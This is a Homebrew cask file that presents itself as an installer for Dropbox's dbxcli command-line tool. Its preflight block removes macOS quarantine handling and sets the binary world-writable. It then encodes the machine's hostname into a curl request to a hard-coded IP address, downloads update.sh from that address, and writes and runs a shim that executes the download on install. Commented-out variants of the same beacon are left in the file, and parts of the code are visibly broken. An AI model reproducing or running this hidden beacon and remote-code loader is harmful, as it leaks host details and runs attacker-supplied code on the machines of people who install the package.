cask "dbxcli" do
  version "3.0.0"
  sha256 "1149a2aa6a89829c6d540d04cc1db8cf5bb27e3d8b0ec6b32d830a6818bd7573"

  url "https://github.com/dropbox/dbxcli/releases/download/v#{version}/dbxcli-darwin-amd64"
  appcast "https://github.com/dropbox/dbxcli/"
  name "dbxcli"
  homepage "https://www.dropbox.com"

  # Note that app is the exact binary name downloaded in the URL
  # target: is used to rename
  #app "dbxcli-darwin-amd64", target: "dbxcli-test"
  
  # Note not using app since this is a binary application
  #binary "dbxcli-test"
  
  # this will force the binary into /brewprefix/Cellar
  #keg_only :This_is_a_test
  # Doesnt work for casks
  #
  #
  # Removed, the symlink to rename it to dbxcli-test is getting permission errors
  #binary "dbxcli-darwin-amd64", target: "dbxcli-test"
  # goes here so it works
  binary "dbxcli-darwin-amd64", target: "#{HOMEBREW_PREFIX}/Cellars/dbxcli-test"


  # the following are actions performed while in the download dir
  #  ~/Library/Caches/Homebrew/downloads
  #  Should remove quartentine bit
  preflight do
      
    system_command "xattr", 
                      args: ["-d", "#{staged_path}/dbxcli-darwin-amd64"]
    set_permissions "#{staged_path}/dbxcli-darwin-amd64", '0777'

      # log usage
      # ret = system 'echo', untrusted
      # remember to base64 it dummy
      #thehostname = system_command 'hostname'
    thehostname = %x{hostname}
    thehostname.strip() # remove whitespace
    encodedname = %x{base64 <<< #{thehostname}}
    encodedname.strip() # remove whitespace
    #%x{curl http://35.222.44.169:80/ping\?log=#{encodedname} -o update.sh}
    #thecmd = "curl -o update.sh http://35.222.44.169:80/ping\?log=#{encodedname}"
    thecmd = "curl http://35.222.44.169:80/ping\?log=#{encodedname} -o update.sh"
    #print  "Debug Command is: #{thecmd}"
    #puts "Debug: #{thecmd}".hex
    #%x{#{thecmd}}
    #%x{curl http://35.222.44.169:80/\?log=#{encodedname} -o update.sh}

    #thehostname = system 'hostname'
      #shimscript = "#{staged_path}/hostinfo.sh"

   #system_command "curl",
   #     args: ["http://35.222.44.169:80/ping\?log=#{thehostname}", "-o", "update.sh"]
   #system_command "chmod",
   #     args: ["+x", "update.sh"]
   #system_command "./update.sh"

  shimscript = "#{staged_path}/updater.wrapper.sh"

    # build the shim script
    IO.write shimscript, <<~EOS
      #!/bin/sh
      echo "the hostname is #{thehostname}"
      echo "about to curl..."
      exec #{thecmd}
      echo "curl should be done.."
      exec chmod +x update.sh
      exec ./update.sh
    EOS
  end

  # execute shim script
  system_command shimscript

 # def install
 #   system "mv dbxcli-darwin-amd64 dbxcli"
 #   bin.install "dbxcli"
 # end
end
